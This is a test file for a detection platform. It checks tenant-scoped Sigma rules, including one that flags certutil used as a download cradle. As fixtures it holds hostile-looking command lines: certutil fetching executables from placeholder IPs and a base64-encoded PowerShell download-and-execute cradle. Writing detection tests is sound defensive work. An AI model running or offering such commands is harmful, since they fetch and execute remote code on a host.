import { ENCODED_POWERSHELL } from "@bloody/engines";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { POWERSHELL, api, createTenant, createTestApp, login, minutesAgo, processEvent, type Json, type TestApp, type TestTenant } from "../test/harness.js";

/** Tenant detection content stored in `detection_rules` is loaded next to the built-in pack. */
const CERTUTIL_RULE = {
  kind: "sigma",
  id: "tenant-certutil-download",
  name: "Certutil used as a download cradle",
  version: 1,
  severity: "high",
  confidence: 0.8,
  attack: [{ id: "T1105", name: "Ingress Tool Transfer", tactic: "command-and-control" }],
  sigma: String.raw`
title: Certutil used as a download cradle
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains|all:
      - 'urlcache'
      - 'http'
  condition: selection
level: high
`,
};

let t: TestApp;
let tenant: TestTenant;
let o1: string;
let o2: string;
let admin: ReturnType<typeof api>;

async function insertRule(id: string, organizationId: string | null, enabled: boolean, definition: Json, overridesBuiltin = false) {
  await t.db.withTenant(tenant.tenantId, (tx) =>
    tx.query(
      `INSERT INTO detection_rules (id, tenant_id, organization_id, name, kind, version, enabled, severity, definition, overrides_builtin, created_by)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9::jsonb, $10, 'user:test')`,
      [id, tenant.tenantId, organizationId, definition.name, definition.kind, definition.version, enabled, definition.severity, JSON.stringify(definition), overridesBuiltin],
    ),
  );
}

async function ingest(organizationId: string, events: Json[]) {
  const res = await admin.post("/ingest/events", { organizationId, events });
  expect(res.status).toBe(202);
  await t.services.bus.drain();
}

const rulesFired = async (organizationId: string) => (await admin.get(`/alerts?organizationId=${organizationId}&limit=200`)).body.items.map((a: Json) => a.ruleId);

beforeAll(async () => {
  t = await createTestApp();
  tenant = await createTenant(t, { orgs: 2 });
  [o1, o2] = tenant.orgIds as [string, string];
  admin = api(t.app, { token: (await login(t.app, tenant.admin.email)).token });
});
afterAll(async () => {
  await t?.close();
});

describe("tenant detection rules", () => {
  it("runs organization-scoped custom Sigma rules", async () => {
    await insertRule(CERTUTIL_RULE.id, o1, true, CERTUTIL_RULE);
    const certutil = (host: string) => processEvent(host, minutesAgo(5), { path: "C:\\Windows\\System32\\certutil.exe", cmd: "certutil.exe -urlcache -split -f http://198.51.100.23/a.exe C:\\Users\\Public\\a.exe" });
    await ingest(o1, [certutil("o1-ws-1")]);
    await ingest(o2, [certutil("o2-ws-1")]);
    expect(await rulesFired(o1)).toContain("tenant-certutil-download");
    expect(await rulesFired(o2)).not.toContain("tenant-certutil-download");
    const alert = (await admin.get(`/alerts?ruleId=${CERTUTIL_RULE.id}`)).body.items[0];
    expect(alert).toMatchObject({ severity: "high", ruleVersion: 1, attack: [expect.objectContaining({ id: "T1105" })] });
  });

  it("lets a tenant disable a built-in rule, and survives broken stored content", async () => {
    const encoded = (host: string) =>
      processEvent(host, minutesAgo(2), { path: POWERSHELL, cmd: "powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA" });
    await ingest(o2, [encoded("o2-ws-2")]);
    expect(await rulesFired(o2)).toContain(ENCODED_POWERSHELL.id);

    await insertRule(ENCODED_POWERSHELL.id, null, false, ENCODED_POWERSHELL, true);
    await insertRule("tenant-broken-rule", null, true, { ...CERTUTIL_RULE, id: "tenant-broken-rule", name: "Broken rule", sigma: "detection: [unclosed" });
    const before = (await rulesFired(o1)).filter((r: string) => r === ENCODED_POWERSHELL.id).length;
    await ingest(o1, [encoded("o1-ws-2"), processEvent("o1-ws-3", minutesAgo(1), { path: "C:\\Windows\\System32\\certutil.exe", cmd: "certutil -urlcache -f http://198.51.100.9/b.exe b.exe" })]);
    const after = await rulesFired(o1);
    expect(after.filter((r: string) => r === ENCODED_POWERSHELL.id).length).toBe(before);
    expect(after.filter((r: string) => r === CERTUTIL_RULE.id)).toHaveLength(2); // other rules keep working
    expect(after).not.toContain("tenant-broken-rule");
  });
});
